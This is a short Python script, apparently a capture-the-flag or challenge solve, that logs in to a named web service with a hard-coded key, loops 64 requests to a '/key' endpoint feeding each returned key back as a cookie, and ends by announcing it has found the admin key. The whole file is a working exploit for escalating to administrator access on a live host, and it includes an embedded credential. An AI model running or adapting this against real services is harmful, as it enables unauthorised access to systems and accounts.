import requests 

s = requests.Session()
s.post('https://xahoo.onrender.com/loginwithkey', data={'key':'WsVJgmbpbIVwyx6Uutp/foE6akppkAqTijdVlAwdWlsQl3auPr1QkYOmMteFhLy5'})
connect_sid_value = s.cookies.get_dict().get('connect.sid', '')

cookies = {
    'connect.sid': connect_sid_value, 
    'key': 'WsVJgmbpbIVwyx6Uutp/foE6akppkAqTijdVlAwdWlsQl3auPr1QkYOmMteFhLy5'
}

key = ''
for i in range(64):
    r = requests.get('https://xahoo.onrender.com/key', cookies=cookies)
    key = r.text[1:]
    cookies['key'] = key
    print(f"{i+1}/64: {key}")

print('\nFound admin key bwehehehe')
print(key)
